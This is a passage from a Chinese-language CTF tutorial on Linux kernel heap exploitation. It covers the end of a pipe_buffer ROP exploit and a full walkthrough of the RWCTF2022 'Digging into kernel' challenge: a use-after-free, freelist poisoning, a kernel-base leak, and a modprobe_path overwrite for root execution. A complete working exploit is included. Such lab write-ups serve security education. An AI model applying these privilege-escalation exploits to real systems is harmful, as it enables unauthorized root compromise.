class="hljs-string">&quot;\033[32m\033[1m[+] Got pipe_buffer: \033[0m0x%lx\n&quot;</span>, <br>            pipe_buffer_addr);<br><br>    <span class="hljs-comment">/* construct fake pipe_buf_operations */</span><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    buf[<span class="hljs-number">0</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[<span class="hljs-number">1</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[<span class="hljs-number">2</span>] = pipe_buffer_addr + <span class="hljs-number">0x18</span>;  <span class="hljs-comment">/* pipe_buffer-&gt;ops */</span><br>    <span class="hljs-comment">/* after release(), we got back here */</span><br>    buf[<span class="hljs-number">3</span>] = kernel_offset + POP_RBX_POP_RBP_POP_R12_RET;<br>    <span class="hljs-comment">/* pipe_buf_operations-&gt;release */</span><br>    buf[<span class="hljs-number">4</span>] = kernel_offset + PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET;<br>    buf[<span class="hljs-number">5</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[<span class="hljs-number">6</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[<span class="hljs-number">7</span>] = kernel_offset + POP_RDI_RET;<br>    buf[<span class="hljs-number">8</span>] = <span class="hljs-literal">NULL</span>;<br>    buf[<span class="hljs-number">9</span>] = kernel_offset + PREPARE_KERNEL_CRED;<br>    buf[<span class="hljs-number">10</span>] = kernel_offset + XCHG_RDI_RAX_DEC_STH_RET;<br>    buf[<span class="hljs-number">11</span>] = kernel_offset + COMMIT_CREDS;<br>    buf[<span class="hljs-number">12</span>] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">0x31</span>;<br>    buf[<span class="hljs-number">13</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[<span class="hljs-number">14</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[<span class="hljs-number">15</span>] = getRootShell;<br>    buf[<span class="hljs-number">16</span>] = user_cs;<br>    buf[<span class="hljs-number">17</span>] = user_rflags;<br>    buf[<span class="hljs-number">18</span>] = user_sp + <span class="hljs-number">8</span>; <span class="hljs-comment">/* system() wants it : ( */</span><br>    buf[<span class="hljs-number">19</span>] = user_ss;<br><br>    del(<span class="hljs-number">0</span>);<br>    alloc(<span class="hljs-number">0</span>, PIPE_BUFFER_SZ, buf);<br><br>    <span class="hljs-comment">/* trigger pipe_buf_operations-&gt;release */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigerring pipe_buf_operations-&gt;release()...&quot;</span>);<br><br>    close(pipe_fd[<span class="hljs-number">1</span>]);<br>    close(pipe_fd[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行即可提权：</p>
<p><img src="https://s2.loli.net/2023/02/09/s56EOhQGcDKe2SN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x07-Kernel-Heap-Arbitrary-Address-Allocation"><a href="#0x07-Kernel-Heap-Arbitrary-Address-Allocation" class="headerlink" title="0x07. Kernel Heap - Arbitrary-Address Allocation"></a>0x07. Kernel Heap - Arbitrary-Address Allocation</h1><p>与用户态 glibc 中分配 fake chunk 后覆写 <code>__free_hook</code> 这样的手法类似，我们同样可以通过覆写 freelist 中的 next 指针的方式完成内核空间中任意地址上的对象分配，并修改一些有用的数据以完成提权</p>
<h2 id="例题：RWCTF2022高校赛-Digging-into-kernel-1-amp-2"><a href="#例题：RWCTF2022高校赛-Digging-into-kernel-1-amp-2" class="headerlink" title="例题：RWCTF2022高校赛 - Digging into kernel 1 &amp; 2"></a>例题：RWCTF2022高校赛 - Digging into kernel 1 &amp; 2</h2><p><a href="/download/rwctf2022/kernel_for_player.tar.xz" title="点击此处下载原题">题目下载 - kernel_for_player.tar.xz</a></p>
<blockquote>
<p>两道题目实际上是同一道题，因为第一题由于启动脚本漏洞所以可以直接拿 flag所以第二道题其实是对第一道题目的脚本的修复</p>
</blockquote>
<h3 id="①-题目分析-2"><a href="#①-题目分析-2" class="headerlink" title="① 题目分析"></a>① 题目分析</h3><p>首先查看启动脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 \<br>    -kernel bzImage \<br>    -initrd rootfs.cpio \<br>    -append <span class="hljs-string">&quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr&quot;</span> \<br>    -cpu kvm64,+smep,+smap \<br>    -monitor null \<br>    --nographic<br></code></pre></td></tr></table></figure>

<p>开启了 smep 和 smap，这里出题人将 kaslr 写成了 kalsr，不过并不影响 kaslr 的默认开启</p>
<p>查看 <code>/sys/devices/system/cpu/vulnerabilities/*</code>，发现开启了 KPTI：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">/home $ cat /sys/devices/system/cpu/vulnerabilities/*<br>Processor vulnerable<br>Mitigation: PTE Inversion<br>Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown<br>Mitigation: PTI<br>Vulnerable<br>Mitigation: usercopy/swapgs barriers and __user pointer sanitization<br>Mitigation: Full generic retpoline, STIBP: disabled, RSB filling<br>Not affected<br></code></pre></td></tr></table></figure>

<p>题目给出了一个 <code>xkmod.ko</code> 文件，按照惯例这应当就是有漏洞的 LKM，拖入 IDA 进行分析</p>
<p>在模块载入时会新建一个 kmem_cache 叫 <code>&quot;lalala&quot;</code>，对应 object 大小是 192，这里我们注意到后面三个参数都是 0 ，对应的是 align（对齐）、flags（标志位）、ctor（构造函数），由于没有设置 <code>SLAB_ACCOUNT</code> 标志位故该 <code>kmem_cache</code> <strong>会默认与 kmalloc-192 合并</strong></p>
<p><img src="https://s2.loli.net/2022/01/25/5NIvpKwQbHFditC.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>定义了一个常规的菜单堆，给了分配、编辑、读取 object 的功能，这里的 buf 是一个全局指针，我们可以注意到 ioctl 中所有的操作<strong>都没有上锁</strong></p>
<p><img src="https://s2.loli.net/2022/01/27/589pIGzWNVQKsiA.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>我们应当传入如下结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Data</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> *ptr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> length;<br>&#125;data;<br></code></pre></td></tr></table></figure>

<p>还定义了一个 <code>copy_overflow()</code> 函数，不过笔者暂时没有发现在哪里有用到这个函数</p>
<p><img src="https://s2.loli.net/2022/02/22/5hQp9OUlkwYNq2g.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>漏洞点主要在关闭设备文件时会释放掉 buf，但是没有将 buf 指针置 NULL，<strong>只要我们同时打开多个设备文件便能完成 UAF</strong></p>
<p><img src="https://s2.loli.net/2022/02/22/l9RL5JDtWo6Febs.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>基本上等于复刻 CISCN-2017 的 babydrive</p>
<blockquote>
<p>某 Pwn 神有言：</p>
<p><img src="https://s2.loli.net/2023/02/07/6CZayv1J2oDqBO7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
</blockquote>
</blockquote>
<h3 id="②-漏洞利用-2"><a href="#②-漏洞利用-2" class="headerlink" title="② 漏洞利用"></a>② 漏洞利用</h3><p>我们有着一个功能全面的“堆面板”，还拥有着近乎可以无限次利用的 UAF，我们已经可以在内核空间中为所欲为了（甚至不需要使用 ioctl 未上锁的漏洞），因此解法也是多种多样的</p>
<h4 id="Step-I-实现内核任意地址读写"><a href="#Step-I-实现内核任意地址读写" class="headerlink" title="Step.I - 实现内核任意地址读写"></a>Step.I - 实现内核任意地址读写</h4><p>我们先看看能够利用 UAF 获取到什么信息，经笔者多次尝试可以发现当我们将 buf 释放掉之后读取其中数据时其前 8 字节都是一个<strong>位于内核堆上的指针</strong>，但通常有着不同的页内偏移，这说明：</p>
<ul>
<li>该 kmem_cache 的 offset 为 0</li>
<li>该 kernel 未开启 HARDENED_FREELIST 保护</li>
<li>该 kernel 开启了 RANDOM_FREELIST 保护</li>
</ul>
<p>freelist 随机化保护并非是一个运行时保护，而是在为 slub 分配页面时会将页面内的 object 指针随机打乱，<strong>但是在后面的分配释放中依然遵循着后进先出的原则</strong>，因此我们可以先获得一个 object 的 UAF，修改其 next 为我们想要分配的地址，之后我们连续进行两次分配<strong>便能够成功获得目标地址上的 object ，实现任意地址读写</strong></p>
<p>但这么做有着一个小问题，当我们分配到目标地址时<strong>目标地址前 8 字节的数据会被写入 freelist，而这通常并非一个有效的地址</strong>，从而导致 kernel panic，因此我们应当尽量选取目标地址往前的一个有着 8 字节 0 的区域，从而使得 freelist 获得一个 NULL 指针，促使 kmem_cache 向 buddy system 请求一个新的 slub，这样就不会发生 crash</p>
<blockquote>
<p>可能有细心的同学发现了：原来的 slub 上面还有一定数量的空闲 object，直接丢弃的话<strong>会导致内存泄漏的发生</strong>，但首先这一小部分内存的泄露并不会造成负面的影响，其次<strong>这也不是我们作为攻击者应该关注的问题</strong>（笑）</p>
</blockquote>
<h4 id="Step-II-泄露内核基地址"><a href="#Step-II-泄露内核基地址" class="headerlink" title="Step.II - 泄露内核基地址"></a>Step.II - 泄露内核基地址</h4><p>接下来我们考虑如何泄露内核基址，虽然题目新建的 <code>kmem_cache</code> 会默认与 <code>kmalloc-192</code> 合并，但为了尊重出题人我们还是将其当作一个独立的 <code>kmem_cache</code> 来完成利用（笑）</p>
<p>在内核“堆基址”（<code>page_offset_base</code>） + <code>0x9d000</code> 处存放着 <code>secondary_startup_64</code> 函数的地址，而我们可以从 free object 的 next 指针获得一个堆上地址，从而去猜测堆的基址，之后分配到一个 <code>堆基址 + 0x9d000</code> 处的 object 以泄露内核基址，这个地址前面刚好有一片为 NULL 的区域方便我们分配</p>
<p>若是没有猜中，笔者认为直接重试即可，但这里需要注意的是我们不能够直接退出，而应当保留原进程的文件描述符打开，否则会在退出进程时触发 slub 的 double free 检测，不过经笔者测验大部分情况下都能够猜中堆基址</p>
<h4 id="Step-III-修改-modprobe-path-以-root-执行程序"><a href="#Step-III-修改-modprobe-path-以-root-执行程序" class="headerlink" title="Step.III - 修改 modprobe_path 以 root 执行程序"></a>Step.III - 修改 modprobe_path 以 root 执行程序</h4><p>接下来我们考虑如何通过任意地址写完成利用，比较常规的做法是覆写内核中的一些全局的可写的函数表（例如 <code>n_tty_ops</code>）来劫持内核执行流，这里笔者选择覆写 <code>modprobe_path</code> 从而以 root 执行程序</p>
<p>当我们尝试去执行（execve）一个非法的文件（file magic not found），内核会经历如下调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">entry_SYSCALL_64()<br>    sys_execve()<br>        do_execve()<br>            do_execveat_common()<br>                bprm_execve()<br>                    exec_binprm()<br>                        search_binary_handler()<br>                            __request_module() <span class="hljs-comment">// wrapped as request_module</span><br>                                call_modprobe()<br></code></pre></td></tr></table></figure>

<p>其中 <code>call_modprobe()</code> 定义于 <code>kernel/kmod.c</code>，我们主要关注这部分代码（以下来着内核源码5.14）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">call_modprobe</span><span class="hljs-params">(<span class="hljs-type">char</span> *module_name, <span class="hljs-type">int</span> wait)</span><br>&#123;<br>	<span class="hljs-comment">//...</span><br>	argv[<span class="hljs-number">0</span>] = modprobe_path;<br>	argv[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-q&quot;</span>;<br>	argv[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;--&quot;</span>;<br>	argv[<span class="hljs-number">3</span>] = module_name;	<span class="hljs-comment">/* check free_modprobe_argv() */</span><br>	argv[<span class="hljs-number">4</span>] = <span class="hljs-literal">NULL</span>;<br><br>	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,<br>					 <span class="hljs-literal">NULL</span>, free_modprobe_argv, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (!info)<br>		<span class="hljs-keyword">goto</span> free_module_name;<br><br>	<span class="hljs-keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);<br>	<span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<p>在这里调用了函数 <code>call_usermodehelper_exec()</code> 将 <code>modprobe_path</code> 作为可执行文件路径以 root 权限将其执行，这个地址上默认存储的值为<code>/sbin/modprobe</code></p>
<p>我们不难想到的是：若是我们能够劫持 modprobe_path，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，<strong>内核将会以 root 权限执行我们的恶意脚本</strong></p>
<h3 id="③-FINAL-EXPLOIT-2"><a href="#③-FINAL-EXPLOIT-2" class="headerlink" title="③ FINAL EXPLOIT"></a>③ FINAL EXPLOIT</h3><p>最后的 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MODPROBE_PATH 0xffffffff82444700</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Data</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> *ptr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> length;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ROOT_SCRIPT_PATH  <span class="hljs-string">&quot;/home/getshell&quot;</span></span><br><span class="hljs-type">char</span> root_cmd[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bindCore</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">allocBuf</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> Data *data)</span><br>&#123;<br>    ioctl(dev_fd, <span class="hljs-number">0x1111111</span>, data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">editBuf</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> Data *data)</span><br>&#123;<br>    ioctl(dev_fd, <span class="hljs-number">0x6666666</span>, data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">readBuf</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> Data *data)</span><br>&#123;<br>    ioctl(dev_fd, <span class="hljs-number">0x7777777</span>, data);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> dev_fd[<span class="hljs-number">5</span>], root_script_fd, flag_fd;<br>    <span class="hljs-type">size_t</span> kernel_heap_leak, kernel_text_leak;<br>    <span class="hljs-type">size_t</span> kernel_base, kernel_offset, page_offset_base;<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Data</span> <span class="hljs-title">data</span>;</span><br><br>    <span class="hljs-comment">/* fundamental works */</span><br>    bindCore(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>        dev_fd[i] = open(<span class="hljs-string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);<br>    &#125;<br><br>    <span class="hljs-comment">/* create fake modprobe_path file */</span><br>    root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);<br>    write(root_script_fd, root_cmd, <span class="hljs-keyword">sizeof</span>(root_cmd));<br>    close(root_script_fd);<br>    system(<span class="hljs-string">&quot;chmod +x &quot;</span> ROOT_SCRIPT_PATH);<br><br>    <span class="hljs-comment">/* construct UAF */</span><br>    data.ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    data.offset = <span class="hljs-number">0</span>;<br>    data.length = <span class="hljs-number">0x50</span>;<br>    <span class="hljs-built_in">memset</span>(data.ptr, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br><br>    allocBuf(dev_fd[<span class="hljs-number">0</span>], &amp;data);<br>    editBuf(dev_fd[<span class="hljs-number">0</span>], &amp;data);<br>    close(dev_fd[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">/* leak kernel heap addr and guess the page_offset_base */</span><br>    readBuf(dev_fd[<span class="hljs-number">1</span>], &amp;data);<br>    kernel_heap_leak = data.ptr[<span class="hljs-number">0</span>];<br>    page_offset_base = kernel_heap_leak &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel heap leak: 0x%lx\n&quot;</span>, kernel_heap_leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] GUESSING page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);<br><br>    <span class="hljs-comment">/* try to alloc fake chunk at (page_offset_base + 0x9d000 - 0x10) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] leaking kernel base...&quot;</span>);<br><br>    data.ptr[<span class="hljs-number">0</span>] = page_offset_base + <span class="hljs-number">0x9d000</span> - <span class="hljs-number">0x10</span>;<br>    data.offset = <span class="hljs-number">0</span>;<br>    data.length = <span class="hljs-number">8</span>;<br><br>    editBuf(dev_fd[<span class="hljs-number">1</span>], &amp;data);<br>    allocBuf(dev_fd[<span class="hljs-number">1</span>], &amp;data);<br>    allocBuf(dev_fd[<span class="hljs-number">1</span>], &amp;data);<br><br>    data.length = <span class="hljs-number">0x40</span>;<br>    readBuf(dev_fd[<span class="hljs-number">1</span>], &amp;data);<br>    <span class="hljs-keyword">if</span> ((data.ptr[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">0xfff</span>) != <span class="hljs-number">0x30</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] invalid data leak: 0x%lx\n&quot;</span>, data.ptr[<span class="hljs-number">2</span>]);<br>        errExit(<span class="hljs-string">&quot;\033[31m\033[1m[x] FAILED TO HIT page_offset_base! TRY AGAIN!&quot;</span>);<br>    &#125;<br><br>    kernel_base = data.ptr[<span class="hljs-number">2</span>] - <span class="hljs-number">0x30</span>;<br>    kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base:\033[0m 0x%lx\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel offset:\033[0m 0x%lx\n&quot;</span>, kernel_offset);<br><br>    <span class="hljs-comment">/* hijack the modprobe_path, we&#x27;ll let it requesting new slub page for it */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking modprobe_path...&quot;</span>);<br><br>    allocBuf(dev_fd[<span class="hljs-number">1</span>], &amp;data);<br>    close(dev_fd[<span class="hljs-number">1</span>]);<br><br>    data.ptr[<span class="hljs-number">0</span>] = kernel_offset + MODPROBE_PATH - <span class="hljs-number">0x10</span>;<br>    data.offset = <span class="hljs-number">0</span>;<br>    data.length = <span class="hljs-number">0x8</span>;<br><br>    editBuf(dev_fd[<span class="hljs-number">2</span>], &amp;data);<br>    allocBuf(dev_fd[<span class="hljs-number">2</span>], &amp;data);<br>    allocBuf(dev_fd[<span class="hljs-number">2</span>], &amp;data);<br><br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *) &amp;data.ptr[<span class="hljs-number">2</span>], ROOT_SCRIPT_PATH);<br>    data.length = <span class="hljs-number">0x30</span>;<br>    editBuf(dev_fd[<span class="hljs-number">2</span>], &amp;data);<br><br>    <span class="hljs-comment">/* trigger the fake modprobe_path */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigerring fake modprobe_path...&quot;</span>);<br><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /home/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;/home/fake&quot;</span>);<br><br>    <span class="hljs-comment">/* read flag */</span><br>    <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(flag));<br>    <br>    flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (flag_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to chmod flag!&quot;</span>);<br>    &#125;<br><br>    read(flag_fd, flag, <span class="hljs-keyword">sizeof</span>(flag));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got flag: \033[0m%s\n&quot;</span>, flag);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行即可获得 flag，不过在推测 <code>page_offset_base</code> 地址时有一定概率失败：</p>
<p><img src="https://s2.loli.net/2023/02/07/ZyLc4zqgkfjOIBt.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="bypass-Slab-Freelist-Hardened"><a href="#bypass-Slab-Freelist-Hardened" class="headerlink" title="bypass Slab Freelist Hardened"></a>bypass Slab Freelist Hardened</h2><p>类似于用户态下 glibc 中的 safe-linking 机制，在内核中的 slab&#x2F;slub 分配器当中也存在着类似的机制保护着 freelist—— <code>SLAB_FREELIST_HARDENED</code>：</p>
<p>对于 freelist 中存储的 object，其 fd 所存储的值为<strong>current object addr 与 next object addr 与 slub cookie</strong>这三个值<strong>异或</strong>所得的值（高版本内核似乎还有个移位），这要求我们在构造任意地址写时需要同时知道这三个值才能通过内核中的检测</p>
<p>在编译内核时在 <code>.config</code> 中添加编译选项 <code>CONFIG_SLAB_FREELIST_HARDENED=y</code> 即可开启这种加固机制（目前新版内核似乎默认开启）</p>
